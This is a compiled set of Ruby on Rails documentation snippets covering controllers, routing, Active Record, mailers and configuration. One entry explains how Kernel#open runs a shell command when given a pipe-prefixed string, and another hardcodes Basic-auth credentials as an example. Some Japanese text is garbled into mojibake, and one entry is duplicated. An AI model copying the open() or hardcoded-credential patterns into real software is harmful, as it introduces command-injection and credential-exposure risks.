----------------------------------------

TITLE: Demonstrating JSON Cookie Serialization Effects on Date Objects
DESCRIPTION: Controller example showing how Date objects are serialized as strings when using JSON-based cookie serialization in Rails 4.1, highlighting the need to handle complex object serialization manually.

LANGUAGE: ruby
CODE:
class CookiesController < ApplicationController
  def set_cookie
    cookies.encrypted[:expiration_date] = Date.tomorrow # => Thu, 20 Mar 2014
    redirect_to action: "read_cookie"
  end

  def read_cookie
    cookies.encrypted[:expiration_date] # => "2014-03-20"
  end
end

----------------------------------------

TITLE: Using stylesheet_link_tag in Rails
DESCRIPTION: Examples of using stylesheet_link_tag to generate link tags for CSS stylesheets with options like media type, supporting various device categories.

LANGUAGE: ruby
CODE:
stylesheet_link_tag("application")
# => <link href="/assets/application.css" rel="stylesheet" />

stylesheet_link_tag("application", media: "all")
# => <link href="/assets/application.css" media="all" rel="stylesheet" />

----------------------------------------

TITLE: Using Beginless Ranges with Inclusion Validators in Active Model
DESCRIPTION: Example showing how to use beginless ranges with inclusivity validators. This allows validating that a value falls within a range with only an upper bound defined.

LANGUAGE: ruby
CODE:
validates_inclusion_of :birth_date, in: -> { (..Date.today) }

----------------------------------------

TITLE: Configuring SHA-1 for Active Record Encryption in Rails 7.1
DESCRIPTION: Shows how to configure Active Record Encryption to use SHA-1 for backward compatibility with data encrypted in previous Rails versions.

LANGUAGE: ruby
CODE:
config.active_record.encryption.hash_digest_class = OpenSSL::Digest::SHA1

----------------------------------------

TITLE: Dropping Test Databases for Active Record
DESCRIPTION: Commands to drop the test databases for Active Record tests when they are no longer needed.

LANGUAGE: bash
CODE:
$ cd activerecord
$ bundle exec rake db:drop

----------------------------------------

TITLE: Using ES6 Modules for JavaScript Dependencies
DESCRIPTION: Example of using ES6 module imports to explicitly control dependencies within JavaScript code, ensuring proper loading order without relying on Propshaft.

LANGUAGE: javascript
CODE:
// main.js
import { initUtilities } from "./utilities.js";
import { setupFeature } from "./feature.js";

initUtilities();
setupFeature();

----------------------------------------

TITLE: Generating a Comment Model with Rails Generator in a Rails Engine
DESCRIPTION: Uses the Rails model generator to create a Comment model within the blorgh engine namespace, with references to an article and a text field.

LANGUAGE: bash
CODE:
$ bin/rails generate model Comment article:references text:text

----------------------------------------

TITLE: Description List Format for Options in Ruby Documentation
DESCRIPTION: Shows how to format a description list for documenting method options or parameters using hyphens between items and descriptions.

LANGUAGE: ruby
CODE:
# * <tt>:allow_nil</tt> - Skip validation if attribute is +nil+.

----------------------------------------

TITLE: Using Date and Time weekend methods in Rails 5.0
DESCRIPTION: New methods added to Date, Time, and DateTime classes for weekend-related operations, allowing easy checking and navigation between weekdays.

LANGUAGE: ruby
CODE:
#on_weekend?
#on_weekday?
#next_weekday
#prev_weekday

----------------------------------------

TITLE: Using the info Command in Rails Debugger
DESCRIPTION: Example showing the output of the info command, which displays local and instance variables available in the current debugging context.

LANGUAGE: ruby
CODE:
(rdbg) info    # command
%self = #<PostsController:0x0000000000af78>
@_action_has_layout = true
@_action_name = "index"
@_config = {}
@_lookup_context = #<ActionView::LookupContext:0x00007fd91a037e38 @details_key=nil, @digest_cache=...
@_request = #<ActionDispatch::Request GET "http://localhost:3000/posts" for 127.0.0.1>
@_response = #<ActionDispatch::Response:0x00007fd91a03ea08 @mon_data=#<Monitor:0x00007fd91a03e8c8>...
@_response_body = nil
@_routes = nil
@marked_for_same_origin_verification = true
@posts = []
@rendered_format = nil

----------------------------------------

TITLE: Generated HTML for Select Boxes with Different Values and Labels
DESCRIPTION: Shows the HTML output for a select box with different option values and display labels. The value attribute contains the code while the displayed text is the full city name.

LANGUAGE: html
CODE:
<select name="city" id="city">
  <option value="BE">Berlin</option>
  <option value="CHI">Chicago</option>
  <option value="MD">Madrid</option>
</select>

----------------------------------------

TITLE: Configuring Production Environment for Asset Pipeline
DESCRIPTION: Production environment settings for the asset pipeline in Rails 3.1, including compression, digest generation, compilation fallbacks, and SSL configuration options.

LANGUAGE: ruby
CODE:
# Compress JavaScripts and CSS
config.assets.compress = true

# Don't fallback to assets pipeline if a precompiled asset is missed
config.assets.compile = false

# Generate digests for assets URLs
config.assets.digest = true

# Defaults to Rails.root.join("public/assets")
# config.assets.manifest = YOUR_PATH

# Precompile additional assets (application.js, application.css, and all non-JS/CSS are already added)
# config.assets.precompile `= %w( admin.js admin.css )


# Force all access to the app over SSL, use Strict-Transport-Security, and use secure cookies.
# config.force_ssl = true

----------------------------------------

TITLE: Using Wildcard Dependencies in ERB Templates
DESCRIPTION: Special comment format for marking wildcard dependencies, used when there are multiple template dependencies in a directory. This approach simplifies maintenance when dealing with many related templates.

LANGUAGE: html+erb
CODE:
<%# Template Dependency: events/* %>
<%= render_categorizable_events @person.events %>

----------------------------------------

TITLE: Creating ApplicationRecord in Rails 5.0
DESCRIPTION: Code needed when upgrading to Rails 5.0 to create the ApplicationRecord base class. This provides a single place to configure app-wide model behavior, similar to ApplicationController for controllers.

LANGUAGE: ruby
CODE:
class ApplicationRecord < ActiveRecord::Base
  self.abstract_class = true
end

----------------------------------------

TITLE: Demonstrating Adequate Record Caching for Active Record Queries in Ruby
DESCRIPTION: Shows examples of Active Record operations that benefit from the Adequate Record performance improvements in Rails 4.2, which caches common SQL queries as prepared statements for reuse.

LANGUAGE: ruby
CODE:
Post.find(1)  # First call generates and cache the prepared statement
Post.find(2)  # Subsequent calls reuse the cached prepared statement

Post.find_by_title('first post')
Post.find_by_title('second post')

Post.find_by(title: 'first post')
Post.find_by(title: 'second post')

post.comments
post.comments(true)

----------------------------------------

TITLE: Configuring Secret Token and Secret Key Base in Rails 4.0
DESCRIPTION: Configuration for setting both the legacy secret_token and the new secret_key_base in Rails 4.0 applications. This allows for transparent upgrade of existing signed cookies while ensuring compatibility.

LANGUAGE: ruby
CODE:
# config/initializers/secret_token.rb
Myapp::Application.config.secret_token = "existing secret token"
Myapp::Application.config.secret_key_base = "new secret key base"

----------------------------------------

TITLE: Comparing to_json and JSON.generate Behavior in Rails
DESCRIPTION: Interactive Ruby console example showing the difference between to_json (which uses Rails features) and JSON.generate (which doesn't have access to Rails-specific features like as_json).

LANGUAGE: irb
CODE:
irb> FooBar.new.to_json
=> "{\"foo\":\"bar\"}"
irb> JSON.generate(FooBar.new)
=> "\"#<FooBar:0x007fa80a481610>\""

----------------------------------------

TITLE: Checking Rails Version in Dev Container
DESCRIPTION: Command to verify the Rails version installed in the development container. This confirms that the environment is correctly set up with the appropriate Rails version.

LANGUAGE: bash
CODE:
$ rails --version
Rails 8.1.0

----------------------------------------

TITLE: Removing JSON Root Element Configuration in Rails 4.0
DESCRIPTION: Rails 4.0 changed the default value of include_root_in_json to false for ActiveModel serializers. This code shows the now-unnecessary configuration that can be removed from wrap_parameters.rb since the behavior is now consistent between Active Model and Active Record.

LANGUAGE: ruby
CODE:
# Disable root element in JSON by default.
# ActiveSupport.on_load(:active_record) do
#   self.include_root_in_json = false
# end

----------------------------------------

TITLE: Adding Support for JSON Patch Format in Rails
DESCRIPTION: Example of adding support for the JSON Patch format in a Rails controller. This includes a controller action and MIME type registration.

LANGUAGE: ruby
CODE:
# in your controller:
def update
  respond_to do |format|
    format.json do
      # perform a partial update
      @article.update params[:article]
    end

    format.json_patch do
      # perform sophisticated change
    end
  end
end

----------------------------------------

TITLE: Implementing HTTP Basic Authentication in Rails Controllers
DESCRIPTION: This snippet demonstrates how to implement HTTP Basic Authentication in a Rails controller using the http_basic_authenticate_with method. This provides a simple way to password-protect controller actions with hardcoded credentials.

LANGUAGE: ruby
CODE:
class AdminsController < ApplicationController
  http_basic_authenticate_with name: "Arthur", password: "42424242"
end

----------------------------------------

TITLE: Configuring Timezone Preservation for to_time
DESCRIPTION: When using Ruby 2.4 with Rails 5, this configuration option controls whether the timezone of the receiver is preserved when calling to_time.

LANGUAGE: ruby
CODE:
ActiveSupport.to_time_preserves_timezone = false

----------------------------------------

TITLE: Using Table Name Assignment in ActiveRecord
DESCRIPTION: Shows the preferred approach to setting the table name in ActiveRecord models using self.table_name= instead of the deprecated set_table_name method.

LANGUAGE: ruby
CODE:
class Project < ActiveRecord::Base
  self.table_name = "project"
end

----------------------------------------

TITLE: Pluralizing with Count Parameter in Ruby
DESCRIPTION: Demonstrates pluralizing with a count parameter, which returns singular or plural forms based on the count value.

LANGUAGE: ruby
CODE:
"dude".pluralize(0) # => "dudes"
"dude".pluralize(1) # => "dude"
"dude".pluralize(2) # => "dudes"

----------------------------------------

TITLE: Creating email previews with ActionMailer::Preview
DESCRIPTION: Shows how to create preview classes for ActionMailer that allow visual inspection of rendered email templates during development. Includes setting up preview paths in the application configuration.

LANGUAGE: ruby
CODE:
class UserMailerPreview < ActionMailer::Preview
  def welcome_email
    UserMailer.with(user: User.first).welcome_email
  end
end

LANGUAGE: ruby
CODE:
config.action_mailer.preview_paths << "#{Rails.root}/lib/mailer_previews"

----------------------------------------

TITLE: Configuring Qmail to Pipe Emails to Action Mailbox
DESCRIPTION: Command to configure Qmail to forward incoming emails to Action Mailbox using the relay ingress. This command specifies the URL and authentication password.

LANGUAGE: bash
CODE:
$ bin/rails action_mailbox:ingress:qmail URL=https://example.com/rails/action_mailbox/relay/inbound_emails INGRESS_PASSWORD=...

----------------------------------------

TITLE: Testing Absence Validation in Rails Console
DESCRIPTION: Interactive Ruby (irb) console example showing how absence validation works when creating a new person object with invitation data.

LANGUAGE: ruby
CODE:
irb> person = Person.new(name: "Jane Doe", invitation_sent_at: Time.current)
irb> person.valid?
=> true # absence validation passes

----------------------------------------

TITLE: Pluralizing with Count Parameter in Ruby
DESCRIPTION: Demonstrates pluralizing with a count parameter, which returns singular or plural forms based on the count value.

LANGUAGE: ruby
CODE:
"dude".pluralize(0) # => "dudes"
"dude".pluralize(1) # => "dude"
"dude".pluralize(2) # => "dudes"

----------------------------------------

TITLE: Listing Available Rails Generators
DESCRIPTION: Commands to create a new Rails application and list all available generators using the bin/rails generate command.

LANGUAGE: bash
CODE:
$ rails new myapp
$ cd myapp
$ bin/rails generate

----------------------------------------

TITLE: Installing Gem Dependencies Without Database Support
DESCRIPTION: Commands to install Ruby gem dependencies without database-related gems, which is useful if you don't need to run Active Record tests.

LANGUAGE: bash
CODE:
$ bundle config set without db
$ bundle install

----------------------------------------

TITLE: Defining Explicit Composite Foreign Keys in Rails Associations
DESCRIPTION: Demonstrates how to explicitly define composite foreign keys for associations when the default behavior is insufficient.

LANGUAGE: ruby
CODE:
class Author < ApplicationRecord
  self.primary_key = [:first_name, :last_name]
  has_many :books, foreign_key: [:first_name, :last_name]
end

class Book < ApplicationRecord
  belongs_to :author, foreign_key: [:author_first_name, :author_last_name]
end

----------------------------------------

TITLE: Referencing API Documentation Links in Ruby Comments
DESCRIPTION: Example of how to reference API documentation using markdown links in comments. This shows the proper format for linking to API documentation methods.

LANGUAGE: ruby
CODE:
[#encrypt_and_sign]: https://api.rubyonrails.org/classes/ActiveSupport/MessageEncryptor.html#method-i-encrypt_and_sign

----------------------------------------

TITLE: Non-cached Adequate Record Examples in Ruby
DESCRIPTION: Demonstrates operations that do not benefit from Adequate Record's prepared statement caching, including finding multiple records by ID lists and using SQL fragments.

LANGUAGE: ruby
CODE:
# not cached
Post.find(1, 2, 3)
Post.find([1,2])

----------------------------------------

TITLE: Customizing Shallow Routes with shallow_path Option in Rails
DESCRIPTION: Demonstrates how to use the shallow_path option to prefix the URLs for shallow routes. This allows customization of the URL structure for member routes of shallow resources.

LANGUAGE: ruby
CODE:
scope shallow_path: "sekret" do
  resources :articles do
    resources :comments, shallow: true
  end
end

----------------------------------------

TITLE: Using Shorthand Syntax for Route Segment Constraints in Rails
DESCRIPTION: Applies constraints to dynamic segments using a more concise syntax. This is equivalent to using the :constraints option but with less verbosity.

LANGUAGE: ruby
CODE:
get "photos/:id", to: "photos#show", id: /[A-Z]\d{5}/

----------------------------------------

TITLE: Configuring System Tests to Use Cuprite Driver
DESCRIPTION: This configuration changes the default driver for system tests from Selenium to Cuprite. It requires adding the cuprite gem and updating the application_system_test_case.rb file.

LANGUAGE: ruby
CODE:
require "test_helper"
require "capybara/cuprite"

class ApplicationSystemTestCase < ActionDispatch::SystemTestCase
  driven_by :cuprite
end

----------------------------------------

TITLE: Ruby Schema Definition Example
DESCRIPTION: This is an example of a Ruby schema file (db/schema.rb) that defines database tables for authors and products using the Ruby schema format.

LANGUAGE: ruby
CODE:
ActiveRecord::Schema[8.1].define(version: 2008_09_06_171750) do
  create_table "authors", force: true do |t|
    t.string   "name"
    t.datetime "created_at"
    t.datetime "updated_at"
  end

  create_table "products", force: true do |t|
    t.string   "name"
    t.text     "description"
    t.datetime "created_at"
    t.datetime "updated_at"
    t.string   "part_number"
  end
end

----------------------------------------

TITLE: Using pluck Method in ActiveRecord Relations
DESCRIPTION: Demonstrates the new pluck method that returns an array of column values directly from the underlying database table without loading complete Active Record objects.

LANGUAGE: ruby
CODE:
Client.where(:active => true).pluck(:id)
# SELECT id from clients where active = 1

----------------------------------------

TITLE: Creating and Saving an Associated Object with belongs_to in Ruby on Rails
DESCRIPTION: Code example showing how to create and save a new author for a book. This builds a new author with the specified attributes, associates it with the book, and saves it to the database.

LANGUAGE: ruby
CODE:
@author = @book.create_author(author_number: 123,
                              author_name: "John Doe")

----------------------------------------

TITLE: Defining Synchronous Class Methods in Action Mailer
DESCRIPTION: Pattern for defining synchronous class methods on a mailer class when synchronous behavior is needed, working around the new deferred execution model in Rails 4.2 Action Mailer.

LANGUAGE: ruby
CODE:
class Notifier < ActionMailer::Base
  def self.broadcast_notifications(users, ...)
    users.each { |user| Notifier.notify(user, ...) }
  end
end

----------------------------------------

TITLE: Verifying Ruby Installation via CLI
DESCRIPTION: This command shows how to verify that Ruby has been installed correctly by checking its version in the terminal.

LANGUAGE: bash
CODE:
$ ruby --version
ruby 3.3.6

----------------------------------------

TITLE: Setting Production Log Level in Rails Application Configuration
DESCRIPTION: Configuration to maintain the info log level in production environment, preventing the default change to debug level in Rails 5. This should be added to the production.rb configuration file.

LANGUAGE: ruby
CODE:
# Set to `:info` to match the current default, or set to `:debug` to opt-into
# the future default.
config.log_level = :info

----------------------------------------

TITLE: Generating Non-English Rails Guides
DESCRIPTION: Shows how to generate Rails guides in languages other than English by using the GUIDES_LANGUAGE environment variable with the rake generation task.

LANGUAGE: bash
CODE:
$ bundle exec rake guides:generate GUIDES_LANGUAGE=es

----------------------------------------

TITLE: Creating a Rails Application with Local Development Version
DESCRIPTION: Command line instructions for creating a Rails application using a local development version of Rails.

LANGUAGE: bash
CODE:
$ ruby /path/to/rails/railties/bin/rails new myapp --dev

----------------------------------------

TITLE: Using Concurrent Ruby with Rails Threading Model
DESCRIPTION: Demonstrates how to properly integrate Concurrent Ruby Promises with Rails threading model. This ensures that futures can safely perform autoloading while the main thread waits for their completion.

LANGUAGE: ruby
CODE:
Rails.application.executor.wrap do
  futures = 3.times.collect do |i|
    Concurrent::Promises.future do
      Rails.application.executor.wrap do
        # do work here
      end
    end
  end

  values = ActiveSupport::Dependencies.interlock.permit_concurrent_loads do
    futures.collect(&:value)
  end
end

----------------------------------------

TITLE: Using Tuple Syntax for Composite Conditions in Rails
DESCRIPTION: Demonstrates how to use tuple-like syntax for querying with composite conditions, particularly useful when working with tables that use composite primary keys.

LANGUAGE: ruby
CODE:
Book.where([:author_id, :id] => [[15, 1], [15, 2]])

----------------------------------------

TITLE: Setting Up Turbo Stream WebSocket Connection
DESCRIPTION: ERB code demonstrating how to set up a WebSocket connection to receive Turbo Stream updates. This connects to the 'posts' channel for real-time updates.

LANGUAGE: erb
CODE:
<%= turbo_stream_from "posts" %>

----------------------------------------

TITLE: Adding Mailgun Signing Key to Rails Credentials
DESCRIPTION: Example of storing the Mailgun Signing key in Rails encrypted credentials for Action Mailbox authentication with Mailgun.

LANGUAGE: yaml
CODE:
action_mailbox:
  mailgun_signing_key: ...

----------------------------------------

TITLE: Rendering Objects with the :renderable Option
DESCRIPTION: Using the :renderable option to render a custom object, which is an alternative syntax for the same functionality as directly passing the object to render.

LANGUAGE: ruby
CODE:
render renderable: Greeting.new

----------------------------------------

TITLE: Handling Long Lines in Ruby Documentation Examples
DESCRIPTION: Demonstrates how to format examples with long lines by placing the result comment on the next line.

LANGUAGE: ruby
CODE:
#   label(:article, :title)
#   # => <label for="article_title">Title</label>
#
#   label(:article, :title, "A short title")
#   # => <label for="article_title">A short title</label>
#
#   label(:article, :title, "A short title", class: "title_label")
#   # => <label for="article_title" class="title_label">A short title</label>

----------------------------------------

TITLE: Implementing Message Rebroadcasting in Ruby
DESCRIPTION: Implements a pattern for rebroadcasting messages received from one client to all connected clients. The receive method broadcasts the data to all subscribers of the channel.

LANGUAGE: ruby
CODE:
# app/channels/chat_channel.rb
class ChatChannel < ApplicationCable::Channel
  def subscribed
    stream_from "chat_#{params[:room]}"
  end

  def receive(data)
    ActionCable.server.broadcast("chat_#{params[:room]}", data)
  end
end

----------------------------------------

TITLE: Flawed Render Example in Rails Controller
DESCRIPTION: An example of a flawed implementation using render action that doesn't properly initialize variables needed by the target template, causing potential errors when rendering.

LANGUAGE: ruby
CODE:
def index
  @books = Book.all
end

def show
  @book = Book.find_by(id: params[:id])
  if @book.nil?
    render action: "index"
  end
end

----------------------------------------

TITLE: Verifying Node.js and Yarn Installation
DESCRIPTION: Commands to verify that Node.js and Yarn are correctly installed and in your path. These are required when using esbuild, Rollup.js, or Webpack bundlers.

LANGUAGE: bash
CODE:
$ node --version

LANGUAGE: bash
CODE:
$ yarn --version

----------------------------------------

TITLE: Documenting Methods with Rails Stack Context
DESCRIPTION: Example of how to document a method with consideration for the entire Rails stack. The comment shows the expected output when using the method within the full Rails framework context.

LANGUAGE: ruby
CODE:
# image_tag("icon.png")
#   # => <img src="/assets/icon.png" />

----------------------------------------

TITLE: Registering additional directories for Rails annotations scanning
DESCRIPTION: You can configure Rails to scan additional directories for annotations using register_directories. This helps when you have code organized in non-standard folders.

LANGUAGE: ruby
CODE:
config.annotations.register_directories("spec", "vendor")

----------------------------------------

TITLE: Demonstrating deep_dup Method for Arrays in Ruby on Rails
DESCRIPTION: Example showing how deep_dup method creates a deep copy of an object, compared to Ruby's standard dup which only creates a shallow copy.

LANGUAGE: ruby
CODE:
array     = ["string"]
duplicate = array.deep_dup

duplicate.first.gsub!("string", "foo")

array     # => ["string"]
duplicate # => ["foo"]

----------------------------------------

TITLE: Setting Docker Registry Access Token for Kamal
DESCRIPTION: Command to export the Docker Hub access token as an environment variable for Kamal deployment.

LANGUAGE: bash
CODE:
export KAMAL_REGISTRY_PASSWORD=your-access-token

----------------------------------------

TITLE: Using ActiveRecord::Base.normalizes for Attribute Normalization
DESCRIPTION: Example demonstrating the new normalizes method which allows automatic normalization of attributes when assigned or queried. The example shows normalizing email and phone attributes.

LANGUAGE: ruby
CODE:
class User < ActiveRecord::Base
  normalizes :email, with: -> email { email.strip.downcase }
  normalizes :phone, with: -> phone { phone.delete("^0-9").delete_prefix("1") }
end

user = User.create(email: " CRUISE-CONTROL@EXAMPLE.COM\n")
user.email                  # => "cruise-control@example.com"

user = User.find_by(email: "\tCRUISE-CONTROL@EXAMPLE.COM ")
user.email                  # => "cruise-control@example.com"
user.email_before_type_cast # => "cruise-control@example.com"

User.where(email: "\tCRUISE-CONTROL@EXAMPLE.COM ").count         # => 1
User.where(["email = ?", "\tCRUISE-CONTROL@EXAMPLE.COM "]).count # => 0

User.exists?(email: "\tCRUISE-CONTROL@EXAMPLE.COM ")         # => true
User.exists?(["email = ?", "\tCRUISE-CONTROL@EXAMPLE.COM "]) # => false

User.normalize_value_for(:phone, "+1 (555) 867-5309") # => "5558675309"

----------------------------------------

TITLE: Creating a Rails application template for Devise installation
DESCRIPTION: A Ruby template that prompts users to install Devise, adds it to the Gemfile, generates a user model, runs migrations, and performs an initial git commit. This template demonstrates interactive prompts and conditional execution in Rails templates.

LANGUAGE: ruby
CODE:
if yes?("Would you like to install Devise?")
  gem "devise"
  devise_model = ask("What would you like the user model to be called?", default: "User")
end

after_bundle do
  if devise_model
    generate "devise:install"
    generate "devise", devise_model
    rails_command "db:migrate"
  end

  git add: ".", commit: %(-m 'Initial commit')
end

----------------------------------------

TITLE: Using ERB Debug Helper to Inspect Variables
DESCRIPTION: Demonstrates how to use the debug helper in ERB to display the contents of the @products variable in YAML format, which is useful for debugging.

LANGUAGE: erb
CODE:
<%= debug @products %>

----------------------------------------

TITLE: HTML Output from grouped_options_for_select Helper
DESCRIPTION: This HTML code shows the output generated by the grouped_options_for_select helper. It demonstrates how option tags are wrapped in optgroup tags and how the selected attribute is applied.

LANGUAGE: html
CODE:
<option value="">Choose a product...</option>
<optgroup label="Hats">
  <option value="Baseball Cap">Baseball Cap</option>
  <option selected="selected" value="Cowboy Hat">Cowboy Hat</option>
</optgroup>

----------------------------------------

TITLE: Using Image Tag in Action Mailer Views
DESCRIPTION: Example of using the image_tag helper in a mailer view after configuring the asset_host. This allows you to display images properly in emails.

LANGUAGE: html+erb
CODE:
<%= image_tag 'image.jpg' %>

----------------------------------------

TITLE: Overriding belongs_to Required by Default on Model Level
DESCRIPTION: Rails 5 allows overriding the global belongs_to_required_by_default setting on a per-model basis, which helps during migration of models to the new behavior.

LANGUAGE: ruby
CODE:
class Book < ApplicationRecord
  # model is not yet ready to have its association required by default

  self.belongs_to_required_by_default = false
  belongs_to(:author)
end

class Car < ApplicationRecord
  # model is ready to have its association required by default

  self.belongs_to_required_by_default = true
  belongs_to(:pilot)
end

----------------------------------------

TITLE: Defining Unicode Character Routes in Rails 4.0
DESCRIPTION: Changes to the syntax for defining routes with Unicode characters in Rails 4.0. The new syntax allows direct use of Unicode characters without escaping.

LANGUAGE: ruby
CODE:
# Rails 3.x
get Rack::Utils.escape("ããã«ã¡ã¯"), controller: "welcome", action: "index"

LANGUAGE: ruby
CODE:
# Rails 4.0
get "ããã«ã¡ã¯", controller: "welcome", action: "index"

----------------------------------------

TITLE: Inner Classes Definition with Proper Nesting
DESCRIPTION: Shows the correct way to define inner classes that will be properly reloaded when the parent class is reloaded. Inner classes and modules are allowed in the same file, unlike multiple top-level constants.

LANGUAGE: ruby
CODE:
# app/models/foo.rb

class Foo
  class InnerClass
  end
end

----------------------------------------

TITLE: Defining a Model with Nested Attributes in Ruby on Rails
DESCRIPTION: This Ruby code defines a Customer model that has many orders and accepts nested attributes for them. The allow_destroy option enables deletion of child records when using nested forms.

LANGUAGE: ruby
CODE:
class Customer < ActiveRecord::Base
  has_many :orders

  accepts_nested_attributes_for :orders, :allow_destroy => true
end

----------------------------------------

TITLE: Streaming PDF Files with send_data in Rails
DESCRIPTION: Shows how to generate and stream PDF files to users using the send_data method. The example creates a PDF document with client information using the Prawn library and sends it as a downloadable file.

LANGUAGE: ruby
CODE:
require "prawn"
class ClientsController < ApplicationController
  # Generates a PDF document with information on the client and
  # returns it. The user will get the PDF as a file download.
  def download_pdf
    client = Client.find(params[:id])
    send_data generate_pdf(client),
              filename: "#{client.name}.pdf",
              type: "application/pdf"
  end

  private
    def generate_pdf(client)
      Prawn::Document.new do
        text client.name, align: :center
        text "Address: #{client.address}"
        text "Email: #{client.email}"
      end.render
    end
end

----------------------------------------

TITLE: Creating a New Rails 3.2 Application
DESCRIPTION: Command line instructions for creating a new Rails 3.2 application using the rails new command.

LANGUAGE: bash
CODE:
# You should have the 'rails' RubyGem installed
$ rails new myapp
$ cd myapp

----------------------------------------

TITLE: Enabling Report-Only CSP Mode for Specific Controller Actions
DESCRIPTION: This controller example shows how to enable Content-Security-Policy-Report-Only mode for specific actions only, allowing selective testing of CSP policies within an application.

LANGUAGE: ruby
CODE:
class PostsController < ApplicationController
  content_security_policy_report_only only: :index
end

----------------------------------------

TITLE: Validating Generated Rails Guides HTML
DESCRIPTION: Command for validating the generated HTML guides to ensure there are no issues such as duplicate IDs, which can happen with automatically generated content.

LANGUAGE: bash
CODE:
$ bundle exec rake guides:validate

----------------------------------------

TITLE: Using Infinite Ranges with Length Validators in Active Model
DESCRIPTION: Example showing how to use infinite ranges with LengthValidator's :in/:within options. This allows setting upper bounds without lower bounds for validating attribute lengths.

LANGUAGE: ruby
CODE:
validates_length_of :first_name, in: ..30

----------------------------------------

TITLE: Configuring Boot Process with config/boot.rb
DESCRIPTION: Sets up the Bundler environment for gem dependencies and configures Bootsnap for performance optimization during application startup.

LANGUAGE: ruby
CODE:
ENV["BUNDLE_GEMFILE"] ||= File.expand_path("../Gemfile", __dir__)

require "bundler/setup" # Set up gems listed in the Gemfile.
require "bootsnap/setup" # Speed up boot time by caching expensive operations.

----------------------------------------

TITLE: Implementing the Index Action in BooksController
DESCRIPTION: Defining the index action in BooksController that retrieves all Book records. This follows Rails' convention of implicitly rendering the matching view template.

LANGUAGE: ruby
CODE:
class BooksController < ApplicationController
  def index
    @books = Book.all
  end
end

----------------------------------------

TITLE: Demonstrating ActionDispatch::Request#content_type Behavior Change in Ruby
DESCRIPTION: Shows the difference in behavior for ActionDispatch::Request#content_type before and after changes. Previously it returned only the MIME type without charset, now it returns the full Content-Type header as provided.

LANGUAGE: ruby
CODE:
request = ActionDispatch::Request.new("CONTENT_TYPE" => "text/csv; header=present; charset=utf-16", "REQUEST_METHOD" => "GET")
request.content_type #=> "text/csv"

----------------------------------------

TITLE: Generating a Comments Controller in a Rails Engine
DESCRIPTION: Uses the Rails controller generator to create a comments controller within the engine namespace.

LANGUAGE: bash
CODE:
$ bin/rails generate controller comments

----------------------------------------

TITLE: Setting Application Configuration with environment Method
DESCRIPTION: Example of adding configuration to the Rails application using the environment method, with environment-specific options.

LANGUAGE: ruby
CODE:
environment 'config.action_mailer.default_url_options = {host: "http://yourwebsite.example.com"}', env: "production"

----------------------------------------

TITLE: Disabling Touch on Models with no_touching in Rails
DESCRIPTION: A new method that allows ignoring touch operations on models when working with associations that have touch: true defined.

LANGUAGE: ruby
CODE:
ActiveRecord::Base.no_touching

----------------------------------------

TITLE: Creating a New Rails Application with Dev Container Support
DESCRIPTION: Command to generate a new Rails application called 'Store' with dev container configuration. The --devcontainer flag ensures that Docker container configuration is included in the generated application.

LANGUAGE: bash
CODE:
$ rails-new store --devcontainer

----------------------------------------

TITLE: Filtering Sensitive Redirect Locations with String
DESCRIPTION: Demonstrates how to filter sensitive locations when redirecting by using the config.filter_redirect configuration option with a string value. This replaces matching URLs with '[FILTERED]' in logs for security purposes.

LANGUAGE: ruby
CODE:
config.filter_redirect << "s3.amazonaws.com"

----------------------------------------

TITLE: Kernel#open OS Command Execution Vulnerability
DESCRIPTION: Demonstration of how Ruby's Kernel#open executes OS commands when the argument starts with a pipe character, creating a potential security risk.

LANGUAGE: ruby
CODE:
open("| ls") { |file| file.read }
# returns file list as a String via `ls` command

----------------------------------------

TITLE: Configuring Generator Fallbacks in Rails
DESCRIPTION: Ruby configuration code that sets up a custom test framework with fallbacks to the default test unit. This allows selective overriding of specific generators while preserving others.

LANGUAGE: ruby
CODE:
config.generators do |g|
  g.test_framework :my_test_unit, fixture: false
  g.fallbacks[:my_test_unit] = :test_unit
end

----------------------------------------

TITLE: Using Mobile Configuration for System Tests
DESCRIPTION: Example of a system test that uses the mobile-specific configuration. It inherits from MobileSystemTestCase to run tests with mobile screen dimensions.

LANGUAGE: ruby
CODE:
require "mobile_system_test_case"

class PostsTest < MobileSystemTestCase
  test "visiting the index" do
    visit posts_url
    assert_selector "h1", text: "Posts"
  end
end

----------------------------------------

TITLE: Documenting Configuration Changes in Rails Guides
DESCRIPTION: Shows the recommended format for documenting new configuration options in the Rails configuration guide. Includes details about the option and its default values across different Rails versions.

LANGUAGE: markdown
CODE:
#### `config.active_job.existing_behavior

| Starting with version | The default value is |
| --------------------- | -------------------- |
| (original)            | `true`               |
| 7.1                   | `false`              |

----------------------------------------

TITLE: Retrieving CSRF Token for Custom Ajax Implementations
DESCRIPTION: Shows how to retrieve the CSRF token from the page's meta tags when using a library other than Rails Request.JS. This approach extracts the token from the meta tag generated by Rails' csrf_meta_tags helper.

LANGUAGE: javascript
CODE:
document.head.querySelector("meta[name=csrf-token]")?.content

----------------------------------------

TITLE: Building a New Associated Object with belongs_to in Ruby on Rails
DESCRIPTION: Code example showing how to build a new author for a book. This creates a new author object with the specified attributes and associates it with the book but doesn't save it to the database.

LANGUAGE: ruby
CODE:
@author = @book.build_author(author_number: 123,
                             author_name: "John Doe")

----------------------------------------

TITLE: Updating Bundler.require in Rails 4 Application Configuration
DESCRIPTION: Example of updating the application.rb file in Rails 4 to use the new Bundler.require syntax. This replaces the assets group which was removed in Rails 4.

LANGUAGE: ruby
CODE:
# Require the gems listed in Gemfile, including any gems
# you've limited to :test, :development, or :production.
Bundler.require(*Rails.groups)

----------------------------------------

TITLE: Using Current Transaction for Commit Callbacks
DESCRIPTION: Example of registering an after_commit callback on the current transaction using the new current_transaction method, which allows registering callbacks outside of the transaction block.

LANGUAGE: ruby
CODE:
Article.current_transaction.after_commit do
  PublishNotificationMailer.with(article: article).deliver_later
end

----------------------------------------

TITLE: Specifying Formats for Shared Partial Caching
DESCRIPTION: This example shows how to explicitly specify the format when rendering a partial for caching. This allows including HTML partials in different file types like JavaScript.

LANGUAGE: ruby
CODE:
render(partial: "hotels/hotel", collection: @hotels, formats: :html, cached: true)

----------------------------------------

TITLE: Registering an Error Subscriber in a Rails Engine or Library
DESCRIPTION: Implementation of a Railtie that registers an error subscriber when a Rails engine or library is loaded. This demonstrates how third-party libraries can integrate with Rails' error reporting.

LANGUAGE: ruby
CODE:
module MySdk
  class Railtie < ::Rails::Railtie
    initializer "my_sdk.error_subscribe" do
      Rails.error.subscribe(MyErrorSubscriber.new)
    end
  end
end

----------------------------------------

TITLE: Default HTML Layout for Action Mailer
